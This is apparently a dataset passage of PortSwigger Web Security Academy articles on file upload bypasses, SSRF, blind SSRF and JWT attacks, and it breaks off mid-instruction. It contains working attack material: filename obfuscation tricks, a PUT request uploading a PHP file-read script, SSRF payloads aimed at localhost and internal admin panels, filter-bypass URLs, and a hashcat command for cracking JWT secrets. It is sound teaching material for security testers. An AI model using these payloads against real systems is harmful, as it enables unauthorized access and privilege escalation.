  Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`\n*   Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.\n\nOther defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:\n\n`exploit.p.phphp`\n\nThis is just a small selection of the many ways it's possible to obfuscate file extensions.\n\n### Flawed validation of the file's contents\n\nInstead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.\n\nIn the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.\n\nSimilarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.\n\nThis is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.\n\n### Exploiting file upload race conditions\n\nModern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.\n\nThat said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous [race conditions](https://portswigger.net/web-security/race-conditions) that enable an attacker to completely bypass even the most robust validation.\n\nFor example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.\n\nThese vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code.\n\n#### Race conditions in URL-based file uploads\n\nSimilar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation.\n\nAs the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.\n\nFor example, if the file is loaded into a temporary directory with a randomized name, in theory, it should be impossible for an attacker to exploit any race conditions. If they don't know the name of the directory, they will be unable to request the file in order to trigger its execution. On the other hand, if the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it can potentially be brute-forced.\n\nTo make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. One way of doing this is by uploading a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.\n\nExploiting file upload vulnerabilities without remote code execution\n--------------------------------------------------------------------\n\nIn the examples we've looked at so far, we've been able to upload server-side scripts for remote code execution. This is the most serious consequence of an insecure file upload function, but these vulnerabilities can still be exploited in other ways.\n\n### Uploading malicious client-side scripts\n\nAlthough you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payloads.\n\nIf the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to [same-origin policy](https://portswigger.net/web-security/cors/same-origin-policy) restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.\n\n### Exploiting vulnerabilities in the parsing of uploaded files\n\nIf the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks.\n\nUploading files using PUT\n-------------------------\n\nIt's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.\n\n```\nPUT /images/exploit.php HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-httpd-php\nContent-Length: 49\n\n<?php echo file_get_contents('/path/to/file'); ?>\n```\n\n#### Tip\n\nYou can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.\n\nHow to prevent file upload vulnerabilities\n------------------------------------------\n\nAllowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:\n\n*   Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.\n*   Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (`../`).\n*   Rename uploaded files to avoid collisions that may cause existing files to be overwritten.\n*   Do not upload files to the server's permanent filesystem until they have been fully validated.\n*   As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.\n", "category": "File Upload"}, {"title": "What is SSRF?", "content": "In this section we explain what server-side request forgery (SSRF) is, and describe some common examples. We also show you how to find and exploit SSRF vulnerabilities.\n\nWhat is SSRF?\n-------------\n\nServer-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.\n\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.\n\n!\n\nLabs\n----\n\nIf you're familiar with the basic concepts behind SSRF vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.\n\n*   [View all SSRF labs](https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf)\n\nWhat is the impact of SSRF attacks?\n-----------------------------------\n\nA successful SSRF attack can often result in unauthorized actions or access to data within the organization. This can be in the vulnerable application, or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.\n\nAn SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks. These can appear to originate from the organization hosting the vulnerable application.\n\nCommon SSRF attacks\n-------------------\n\nSSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions. These trust relationships might exist in relation to the server, or in relation to other back-end systems within the same organization.\n\n### SSRF attacks against the server\n\nIn an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like `127.0.0.1` (a reserved IP address that points to the loopback adapter) or `localhost` (a commonly used name for the same adapter).\n\nFor example, imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. When a user views the stock status for an item, their browser makes the following request:\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n```\n\nThis causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.\n\nIn this example, an attacker can modify the request to specify a URL local to the server:\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n```\n\nThe server fetches the contents of the `/admin` URL and returns it to the user.\n\nAn attacker can visit the `/admin` URL, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won't see anything of interest. However, if the request to the `/admin` URL comes from the local machine, the normal [access controls](https://portswigger.net/web-security/access-control) are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.\n\nWhy do applications behave in this way, and implicitly trust requests that come from the local machine? This can arise for various reasons:\n\n*   The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.\n*   For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system if they lose their credentials. This assumes that only a fully trusted user would come directly from the server.\n*   The administrative interface might listen on a different port number to the main application, and might not be reachable directly by users.\n\nThese kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, often make SSRF into a critical vulnerability.\n\n### SSRF attacks against other back-end systems\n\nIn some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses. The back-end systems are normally protected by the network topology, so they often have a weaker security posture. In many cases, internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems.\n\nIn the previous example, imagine there is an administrative interface at the back-end URL ` https://192.168.0.68/admin`. An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://192.168.0.68/admin\n```\n\nCircumventing common SSRF defenses\n----------------------------------\n\nIt is common to see applications containing SSRF behavior together with defenses aimed at preventing malicious exploitation. Often, these defenses can be circumvented.\n\n### SSRF with blacklist-based input filters\n\nSome applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:\n\n*   Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.\n*   Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.\n*   Obfuscate blocked strings using URL encoding or case variation.\n*   Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.\n\n### SSRF with whitelist-based input filters\n\nSome applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.\n\nThe URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:\n\n*   You can embed credentials in a URL before the hostname, using the `@` character. For example:\n    \n    `https://expected-host:fakepassword@evil-host`\n*   You can use the `#` character to indicate a URL fragment. For example:\n    \n    `https://evil-host#expected-host`\n*   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:\n    \n    `https://expected-host.evil-host`\n*   You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try [double-encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding) characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.\n*   You can use combinations of these techniques together.\n\n### Bypassing SSRF filters via open redirection\n\nIt is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.\n\nIn the previous example, imagine the user-submitted URL is strictly validated to prevent malicious exploitation of the SSRF behavior. However, the application whose URLs are allowed contains an open redirection vulnerability. Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.\n\nFor example, the application contains an open redirection vulnerability in which the following URL:\n\n`/product/nextProduct?currentProductId=6&path=http://evil-user.net`\n\nreturns a redirection to:\n\n`http://evil-user.net`\n\nYou can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin\n```\n\nThis SSRF exploit works because the application first validates that the supplied `stockAPI` URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.\n\nBlind SSRF vulnerabilities\n--------------------------\n\nBlind SSRF vulnerabilities occur if you can cause an application to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.\n\nBlind SSRF is harder to exploit but sometimes leads to full remote code execution on the server or other back-end components.\n\nMany server-side request forgery vulnerabilities are easy to find, because the application's normal traffic involves request parameters containing full URLs. Other examples of SSRF are harder to locate.\n\n### Partial URLs in requests\n\nSometimes, an application places only a hostname or part of a URL path into request parameters. The value submitted is then incorporated server-side into a full URL that is requested. If the value is readily recognized as a hostname or URL path, the potential attack surface might be obvious. However, exploitability as full SSRF might be limited because you do not control the entire URL that gets requested.\n\n### URLs within data formats\n\nSome applications transmit data in formats with a specification that allows the inclusion of URLs that might get requested by the data parser for the format. An obvious example of this is the XML data format, which has been widely used in web applications to transmit structured data from the client to the server. When an application accepts data in XML format and parses it, it might be vulnerable to [XXE injection](https://portswigger.net/web-security/xxe). It might also be vulnerable to SSRF via XXE. We'll cover this in more detail when we look at XXE injection vulnerabilities.\n\nSome applications use server-side analytics software to tracks visitors. This software often logs the Referer header in requests, so it can track incoming links. Often the analytics software visits any third-party URLs that appear in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header is often a useful attack surface for SSRF vulnerabilities.\n", "category": "SSRF"}, {"title": "Blind SSRF vulnerabilities", "content": "### Server-side request forgery (SSRF)\n\n*   [What is SSRF?](https://portswigger.net/web-security/ssrf#what-is-ssrf)\n*   [Impact](https://portswigger.net/web-security/ssrf#what-is-the-impact-of-ssrf-attacks)\n*    [Common SSRF attacks](https://portswigger.net/web-security/ssrf#common-ssrf-attacks)\n    *   [Against the server itself](https://portswigger.net/web-security/ssrf#ssrf-attacks-against-the-server)\n    *   [Against other back-end systems](https://portswigger.net/web-security/ssrf#ssrf-attacks-against-other-back-end-systems)\n*    [Circumventing common SSRF defenses](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses)\n    *   [Blacklist-based input filters](https://portswigger.net/web-security/ssrf#ssrf-with-blacklist-based-input-filters)\n    *   [Whitelist-based input filters](https://portswigger.net/web-security/ssrf#ssrf-with-whitelist-based-input-filters)\n    *   [Bypassing filters via open redirection](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)\n*    [Blind SSRF vulnerabilities](https://portswigger.net/web-security/ssrf/blind)\n    *   [Impact](https://portswigger.net/web-security/ssrf/blind#what-is-the-impact-of-blind-ssrf-vulnerabilities)\n    *   [Finding and exploiting blind SSRF](https://portswigger.net/web-security/ssrf/blind#how-to-find-and-exploit-blind-ssrf-vulnerabilities)\n*    [Finding hidden attack surface for SSRF](https://portswigger.net/web-security/ssrf#finding-hidden-attack-surface-for-ssrf-vulnerabilities)\n    *   [Partial URLs in requests](https://portswigger.net/web-security/ssrf#partial-urls-in-requests)\n    *   [URLs within data formats](https://portswigger.net/web-security/ssrf#urls-within-data-formats)\n    *   [SSRF via the Referer header](https://portswigger.net/web-security/ssrf#ssrf-via-the-referer-header)\n*   [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)\n*   [View all SSRF labs](https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [SSRF](https://portswigger.net/web-security/ssrf)\n*   [Blind](https://portswigger.net/web-security/ssrf/blind)\n\nBlind SSRF vulnerabilities\n==========================\n\nIn this section, we'll explain what blind [server-side request forgery](https://portswigger.net/web-security/ssrf) is, describe some common blind SSRF examples, and explain how to find and exploit blind SSRF vulnerabilities.\n\nWhat is blind SSRF?\n-------------------\n\nBlind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.\n\nWhat is the impact of blind SSRF vulnerabilities?\n-------------------------------------------------\n\nThe impact of blind SSRF vulnerabilities is often lower than fully informed SSRF vulnerabilities because of their one-way nature. They cannot be trivially exploited to retrieve sensitive data from back-end systems, although in some situations they can be exploited to achieve full remote code execution.\n\nHow to find and exploit blind SSRF vulnerabilities\n--------------------------------------------------\n\nThe most reliable way to detect blind SSRF vulnerabilities is using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques. This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system.\n\nThe easiest and most effective way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). You can use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate unique domain names, send these in payloads to the application, and monitor for any interaction with those domains. If an incoming HTTP request is observed coming from the application, then it is vulnerable to SSRF.\n\n#### Note\n\nIt is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied Collaborator domain, but no subsequent HTTP request. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the actual HTTP request was blocked by network-level filtering. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations.\n\nLAB\n\nPRACTITIONER [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)\n\nSimply identifying a blind [SSRF vulnerability](https://portswigger.net/web-security/ssrf) that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. Since you cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server.\n\nLAB\n\nEXPERT [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)\n\nAnother avenue for exploiting blind SSRF vulnerabilities is to induce the application to connect to a system under the attacker's control, and return malicious responses to the HTTP client that makes the connection. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve remote code execution within the application infrastructure.\n\n#### Read more\n\n*   [Cracking the lens: Remote client exploits](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient)\n\n", "category": "SSRF"}, {"title": "What is JWT?", "content": "In this section, we'll look at how design issues and flawed handling of JSON web tokens (JWTs) can leave websites vulnerable to a variety of high-severity attacks. As JWTs are most commonly used in authentication, session management, and access control mechanisms, these vulnerabilities can potentially compromise the entire website and its users.\n\nDon't worry if you're not familiar with JWTs and how they work - we'll cover all of the relevant details as we go. We've also provided a number of deliberately vulnerable labs so that you can practice exploiting these vulnerabilities safely against realistic targets.\n\n!\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind JWT attacks and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all JWT labs](https://portswigger.net/web-security/all-labs#jwt)\n\n#### Tip\n\nFrom [Burp Suite Professional 2022.5.1](https://portswigger.net/burp/releases/professional-community-2022-5-1?requestededition=professional), [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner) can automatically detect a number of vulnerabilities in JWT mechanisms on your behalf. For more information, see the related issue definitions on the **Target \\> Issued definitions** tab.\n\nWhat are JWTs?\n--------------\n\nJSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (\"claims\") about users as part of authentication, session handling, and access control mechanisms.\n\nUnlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.\n\n### JWT format\n\nA JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example:\n\n`eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA`\n\nThe header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual \"claims\" about the user. For example, you can decode the payload from the token above to reveal the following claims:\n\n```\n{\n    \"iss\": \"portswigger\",\n    \"exp\": 1648037164,\n    \"name\": \"Carlos Montoya\",\n    \"sub\": \"carlos\",\n    \"role\": \"blog_author\",\n    \"email\": \"carlos@carlos-montoya.net\",\n    \"iat\": 1516239022\n}\n```\n\nIn most cases, this data can be easily read or modified by anyone with access to the token. Therefore, the security of any JWT-based mechanism is heavily reliant on the cryptographic signature.\n\n### JWT signature\n\nThe server that issues the token typically generates the signature by hashing the header and payload. In some cases, they also encrypt the resulting hash. Either way, this process involves a secret signing key. This mechanism provides a way for servers to verify that none of the data within the token has been tampered with since it was issued:\n\n*   As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.\n    \n*   Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload.\n    \n\n#### Tip\n\nIf you want to gain a better understanding of how JWTs are constructed, you can use the debugger on `jwt.io` to experiment with arbitrary tokens.\n\n### JWT vs JWS vs JWE\n\nThe JWT specification is actually very limited. It only defines a format for representing information (\"claims\") as a JSON object that can be transferred between two parties. In practice, JWTs aren't really used as a standalone entity. The JWT spec is extended by both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications, which define concrete ways of actually implementing JWTs.\n\n!\n\nIn other words, a JWT is usually either a JWS or JWE token. When people use the term \"JWT\", they almost always mean a JWS token. JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded.\n\n#### Note\n\nFor simplicity, throughout these materials, \"JWT\" refers primarily to JWS tokens, although some of the vulnerabilities described may also apply to JWE tokens.\n\nWhat are JWT attacks?\n---------------------\n\nJWT attacks involve a user sending modified JWTs to the server in order to achieve a malicious goal. Typically, this goal is to bypass authentication and [access controls](https://portswigger.net/web-security/access-control) by impersonating another user who has already been authenticated.\n\nWhat is the impact of JWT attacks?\n----------------------------------\n\nThe impact of JWT attacks is usually severe. If an attacker is able to create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full control of their accounts.\n\nHow do vulnerabilities to JWT attacks arise?\n--------------------------------------------\n\nJWT vulnerabilities typically arise due to flawed JWT handling within the application itself. The [various specifications](https://portswigger.net/web-security/jwt#jwt-vs-jws-vs-jwe) related to JWTs are relatively flexible by design, allowing website developers to decide many implementation details for themselves. This can result in them accidentally introducing vulnerabilities even when using battle-hardened libraries.\n\nThese implementation flaws usually mean that the signature of the JWT is not verified properly. This enables an attacker to tamper with the values passed to the application via the token's payload. Even if the signature is robustly verified, whether it can truly be trusted relies heavily on the server's secret key remaining a secret. If this key is leaked in some way, or can be guessed or brute-forced, an attacker can generate a valid signature for any arbitrary token, compromising the entire mechanism.\n\nHow to work with JWTs in Burp Suite\n-----------------------------------\n\nIn case you haven't worked with JWTs in the past, we recommend familiarizing yourself with the relevant features of Burp Suite before attempting the labs in this topic.\n\nExploiting flawed JWT signature verification\n--------------------------------------------\n\nBy design, servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about the original contents of the token, or even what the original signature was. Therefore, if the server doesn't verify the signature properly, there's nothing to stop an attacker from making arbitrary changes to the rest of the token.\n\nFor example, consider a JWT containing the following claims:\n\n```\n{\n    \"username\": \"carlos\",\n    \"isAdmin\": false\n}\n```\n\nIf the server identifies the session based on this `username`, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the `isAdmin` value is used for access control, this could provide a simple vector for privilege escalation.\n\nIn the first couple of labs, you'll see some examples of how these vulnerabilities might look in real-world applications.\n\n### Accepting arbitrary signatures\n\nJWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library `jsonwebtoken` has `verify()` and `decode()`.\n\nOccasionally, developers confuse these two methods and only pass incoming tokens to the `decode()` method. This effectively means that the application doesn't verify the signature at all.\n\n### Accepting tokens with no signature\n\nAmong other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.\n\n```\n{\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\"\n}\n```\n\nThis is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker can directly influence how the server checks whether the token is trustworthy.\n\nJWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called \"unsecured JWT\". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.\n\n#### Note\n\nEven if the token is unsigned, the payload part must still be terminated with a trailing dot.\n\nBrute-forcing secret keys\n-------------------------\n\nSome signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.\n\nWhen implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, it can be trivial for an attacker to brute-force a server's secret using a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).\n\n### Brute-forcing secret keys using hashcat\n\nWe recommend using hashcat to brute-force secret keys. You can [install hashcat manually](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat), but it also comes pre-installed and ready to use on Kali Linux.\n\n#### Note\n\nIf you're using the pre-built VirtualBox image for Kali rather than the bare metal installer version, this may not have enough memory allocated to run hashcat.\n\nYou just need a valid, signed JWT from the target server and a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list). You can then run the following command, passing in the JWT and wordlist as arguments:\n\n`hashcat -a 0 -m 16500 <jwt> <wordlist>`\n\nHashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server. If any of the signatures match, hashcat outputs the identified secret in the following format, along with various other details:\n\n`<jwt>:<identified-secret>`\n\n#### Note\n\nIf you run the command more than once, you need to include the `--show` flag to output the results.\n\nAs hashcat runs locally on your machine and doesn't rely on sending requests to the server, this process is extremely quick, even when using a huge wordlist.\n\nOnce you have identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. For details on how to re-sign a modified JWT in Burp Suite, see [Editing JWTs](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#editing-jwts).\n\nIf the server uses an extremely weak secret, it may even be possible to brute-force this character-by-character rather than using a wordlist.\n\nAccording to the JWS specification, only the `alg` header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.\n\n*   `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.\n    \n*   `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.\n    \n*   `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching `kid` parameter.\n    \n\nAs you can see, these user-controllable parameters each tell the recipient server which key to use when verifying the signature. In this section, you'll learn how to exploit these to inject modified JWTs signed using your own arbitrary key rather than the server's secret.\n\n### Injecting self-signed JWTs via the jwk parameter\n\nThe JSON Web Signature (JWS) specification describes an optional `jwk` header parameter, which servers can use to embed their public key directly within the token itself in JWK format.\n\n#### JWK\n\nA JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.\n\nYou can see an example of this in the following JWT header:\n\n```\n{\n    \"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\",\n    \"typ\": \"JWT\",\n    \"alg\": \"RS256\",\n    \"jwk\": {\n        \"kty\": \"RSA\",\n        \"e\": \"AQAB\",\n        \"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\",\n        \"n\": \"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\"\n    }\n}\n```\n\n#### Public and private keys\n\nIn case you're not familiar with the terms \"public key\" and \"private key\", we've covered this as part of our materials on algorithm confusion attacks. For more information, see [Symmetric vs asymmetric algorithms](https://portswigger.net/web-security/jwt/algorithm-confusion#symmetric-vs-asymmetric-algorithms).\n\nIdeally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the `jwk` parameter.\n\nYou can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the `jwk` header.\n\nAlthough you can manually add or modify the `jwk` parameter in Burp, the [JWT Editor extension](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) provides a useful feature to help you test for this vulnerability:\n\n1.  With the extension loaded, in Burp's main tab bar, go to the **JWT Editor Keys** tab.\n    \n2.  [Generate a new RSA key.](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#adding-a-jwt-signing-key)\n    \n3.  Send a request containing a JWT to 